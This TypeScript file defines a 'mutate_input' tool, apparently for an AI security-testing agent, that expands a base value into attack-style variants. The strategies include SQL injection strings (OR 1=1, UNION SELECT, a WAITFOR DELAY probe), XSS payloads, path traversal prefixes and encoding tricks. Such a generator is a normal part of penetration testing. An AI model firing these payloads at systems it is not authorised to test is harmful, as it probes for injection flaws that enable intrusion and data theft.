import z from "zod"
import { Tool } from "../../tool/tool"
import { makeToolResultEnvelope } from "./result-envelope"

const DESCRIPTION = `Generate deterministic input variants from a base value.
Use this primitive to expand test candidates before probe/verify steps.`

const STRATEGY = z.enum([
  "sqli",
  "xss",
  "path_traversal",
  "url_encode",
  "double_url_encode",
  "case_flip",
  "quote_break",
])

function mutate(base: string, strategy: z.infer<typeof STRATEGY>): string[] {
  if (strategy === "url_encode") return [encodeURIComponent(base)]
  if (strategy === "double_url_encode") return [encodeURIComponent(encodeURIComponent(base))]
  if (strategy === "case_flip") return [base.toUpperCase(), base.toLowerCase()]
  if (strategy === "quote_break") return [`'${base}`, `"${base}`, `${base}'`, `${base}"`]
  if (strategy === "path_traversal") {
    return [
      `../${base}`,
      `../../${base}`,
      `..%2f${base}`,
      `%2e%2e/${base}`,
      `..\\${base}`,
    ]
  }
  if (strategy === "xss") {
    return [
      `${base}<script>alert(1)</script>`,
      `${base}\"><img src=x onerror=alert(1)>`,
      `${base}<svg/onload=alert(1)>`,
      `${base}javascript:alert(1)`,
    ]
  }
  return [
    `${base}' OR '1'='1`,
    `${base}" OR "1"="1`,
    `${base}' UNION SELECT NULL--`,
    `${base}'; WAITFOR DELAY '0:0:5'--`,
    `${base}' AND 1=2--`,
  ]
}

export const MutateInputTool = Tool.define("mutate_input", {
  description: DESCRIPTION,
  parameters: z.object({
    base: z.string().describe("Base value or payload"),
    strategy: STRATEGY.describe("Mutation strategy"),
    max_variants: z.number().min(1).max(50).optional().describe("Maximum variants to return"),
  }),
  async execute(params) {
    const items = mutate(params.base, params.strategy)
    const limit = params.max_variants ?? 8
    const dedup = new Set<string>()
    const variants: string[] = []
    for (const item of items) {
      if (dedup.has(item)) continue
      dedup.add(item)
      variants.push(item)
      if (variants.length >= limit) break
    }

    return {
      title: `Mutations: ${variants.length} (${params.strategy})`,
      metadata: {
        strategy: params.strategy,
        count: variants.length,
      } as any,
      envelope: makeToolResultEnvelope({
        status: "ok",
        observations: variants.map((item, idx) => ({
          type: "mutation_variant",
          index: idx,
          value: item,
          strategy: params.strategy,
        })),
        metrics: {
          variant_count: variants.length,
        },
      }),
      output: JSON.stringify(
        {
          base: params.base,
          strategy: params.strategy,
          variants,
        },
        null,
        2,
      ),
    }
  },
})
